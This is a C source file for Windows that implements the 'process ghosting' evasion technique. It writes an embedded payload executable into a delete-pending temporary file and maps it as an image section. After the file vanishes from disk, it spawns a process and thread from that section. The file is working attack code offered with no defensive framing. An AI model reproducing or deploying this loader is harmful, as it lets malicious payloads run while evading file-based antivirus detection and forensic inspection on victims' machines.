#include <windows.h>
#include <stdio.h>
#include "../common/embedded_dll.h"

// Process Ghosting Implementation:
// 1. Create file with DELETE and GENERIC_WRITE permissions
// 2. Put file into delete-pending state via NtSetInformationFile (FileDispositionInformation)
// 3. Write payload PE into delete-pending file
// 4. Create image section object via NtCreateSection(SEC_IMAGE)
// 5. Close file handle (file immediately disappears from filesystem while section remains valid)
// 6. Create process from section via NtCreateProcessEx
// 7. Setup process environment and thread via NtCreateThreadEx

typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#ifndef SEC_IMAGE
#define SEC_IMAGE 0x01000000
#endif

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef struct _FILE_DISPOSITION_INFORMATION {
    BOOLEAN DeleteFile;
} FILE_DISPOSITION_INFORMATION, *PFILE_DISPOSITION_INFORMATION;

typedef NTSTATUS (NTAPI *pfnNtSetInformationFile)(
    HANDLE FileHandle,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    ULONG FileInformationClass
);

typedef NTSTATUS (NTAPI *pfnNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

typedef NTSTATUS (NTAPI *pfnNtCreateProcessEx)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ParentProcess,
    ULONG Flags,
    HANDLE SectionHandle,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    ULONG JobMemberLevel
);

typedef NTSTATUS (NTAPI *pfnNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG_PTR ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

int main() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pfnNtSetInformationFile NtSetInformationFile = (pfnNtSetInformationFile)GetProcAddress(hNtdll, "NtSetInformationFile");
    pfnNtCreateSection NtCreateSection = (pfnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pfnNtCreateProcessEx NtCreateProcessEx = (pfnNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
    pfnNtCreateThreadEx NtCreateThreadEx = (pfnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    if (!NtSetInformationFile || !NtCreateSection) return 1;

    char tempPath[MAX_PATH];
    char tempFile[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    GetTempFileNameA(tempPath, "ghs", 0, tempFile);

    // 1. Create file with DELETE and GENERIC_WRITE permissions
    HANDLE hFile = CreateFileA(
        tempFile,
        GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) return 1;

    // 2. Put file into delete-pending state
    IO_STATUS_BLOCK ioBlock = {0};
    FILE_DISPOSITION_INFORMATION dispInfo = { TRUE };
    NTSTATUS status = NtSetInformationFile(hFile, &ioBlock, &dispInfo, sizeof(dispInfo), 13 /* FileDispositionInformation */);
    if (status != STATUS_SUCCESS) {
        CloseHandle(hFile);
        return 1;
    }

    // 3. Write payload PE binary into delete-pending file
    DWORD written = 0;
    WriteFile(hFile, embedded_dll, embedded_dll_len, &written, NULL);

    // 4. Create image Section Object from delete-pending file
    HANDLE hSection = NULL;
    status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hFile
    );

    // 5. Close file handle: file is deleted from filesystem immediately!
    CloseHandle(hFile);

    if (status != STATUS_SUCCESS || !hSection) {
        return 1;
    }

    // 6. Create process directly from orphaned Section handle
    HANDLE hGhostProcess = NULL;
    if (NtCreateProcessEx) {
        status = NtCreateProcessEx(
            &hGhostProcess,
            PROCESS_ALL_ACCESS,
            NULL,
            GetCurrentProcess(),
            0,
            hSection,
            NULL,
            NULL,
            0
        );
    }

    if (hGhostProcess && NtCreateThreadEx) {
        // Query entry point from PE header of embedded_dll
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)embedded_dll;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(embedded_dll + dos->e_lfanew);
        PVOID entryPoint = (PVOID)(nt->OptionalHeader.ImageBase + nt->OptionalHeader.AddressOfEntryPoint);

        HANDLE hThread = NULL;
        status = NtCreateThreadEx(
            &hThread,
            THREAD_ALL_ACCESS,
            NULL,
            hGhostProcess,
            entryPoint,
            NULL,
            0,
            0,
            0,
            0,
            NULL
        );
        if (hThread) {
            WaitForSingleObject(hThread, 5000);
            CloseHandle(hThread);
        }
        CloseHandle(hGhostProcess);
    } else if (hGhostProcess) {
        CloseHandle(hGhostProcess);
    }

    CloseHandle(hSection);
    return 0;
}
